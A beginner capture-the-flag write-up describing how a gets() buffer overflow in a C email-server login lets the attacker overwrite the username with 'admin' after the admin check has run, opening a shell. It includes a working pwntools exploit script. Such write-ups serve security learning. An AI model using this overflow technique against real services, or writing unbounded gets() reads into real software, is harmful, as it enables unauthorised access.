# Corporate Cliche
**Category** - <span style="color:blue;">Beginner</span>

## Challenge Text
It's time to really push the envelope and go above and beyond! We've got a new challenge for you. Can you find a way to get into our email server?

Regards,
Blue Alder

## Goal
Access email server and assumingly get flag from server

## Initial Observations
I was given a c program `email_server.c` that showed how logins to the server were handled.

I noticed a few interesting features of this c program.

There is a check that if the username given is admin that the program exits
```c
if (strcmp(username, "admin") == 0) {
        printf("-> Admin login is disabled. Access denied.\n");
        exit(0);
    }
```

Later in the program execution there is a check for the correct password, this also checks if the username given is admin but this time if it is admin it opens a shell.
```c
if (strcmp(username, "admin") == 0) {
                    open_admin_session();
                } else {
                    print_email();
                }
```

* Interesting, it seems to be two conflicting conditions for the same username, how can this be?
* I wonder if there is a way to somehow change the username mid execution after the first check is performed so that admin session will be opened.

The valid logins with the `username` and `password` are hardcoded in the program
```c
const char* logins[][2] = {
    {"admin", "🇦🇩🇲🇮🇳"},
    {"guest", "guest"},
};
```

The `password` is initalised first and straight afterwards the `username` is initalised. This means that in memory the password should be sitting alongside the username. It should look like `| password[0..31] | username[0..31] |`
```c
    char password[32];
    char username[32];
```

The `username` and `password` strings are obtained using different `input` methods.
The `username` is obtained using `fgets()`
```c
    printf("Enter your username: ");
    fgets(username, sizeof(username), stdin);
```

The password uses `gets()`
```c
    printf("Enter your password: ");
    gets(password);
```

* It is noted that `gets()` is **unsafe** because it has *no bounds* checking allows `buffer overflows`
* Both the strings are initalised as 32 long strings
* Using `gets()` allows me to enter more than 32 bytes into `password` and overflow data into the `username` string

## Steps Taken
1. At the username prompt, enter anything, as long as it isn't `admin` the program will continue
2. At the password prompt, enter the password for `admin` - `🇦🇩🇲🇮🇳` and then fill the remaining space of the string with junk to progress or overflow into the username string, at the start of the `username` string put in `admin`.
3. This can be performed with a python script using pwntools library

```python
from pwn import *

# Set up connection (replace with actual host/port)
HOST = 'localhost'  # Replace with actual target
PORT = 1337  # Replace with actual port

# Start connection
conn = remote(HOST, PORT)

# Step 1: Send dummy username that passes the check
conn.sendlineafter(b"Enter your username: ", b"guest")

# Step 2: Build payload to overflow password and overwrite username
emoji_pw = "🇦🇩🇲🇮🇳".encode('utf-8') # Actual password for admin user
padding = b"A" * (32 - len(emoji_pw + b"\x00"))       # Fill password buffer
username = b"admin\x00"   # Overwrite username with "admin"

payload = emoji_pw + b"\x00" + padding + username 

# Step 3: Send payload
conn.sendlineafter(b"Enter your password: ", payload + b'\n')

# Interact with shell if successful
conn.interactive()
```

4. A shell was opened and a directory listing revealed that the flag was sitting in the directory using `cat flag.txt` the flag was able to be obtained.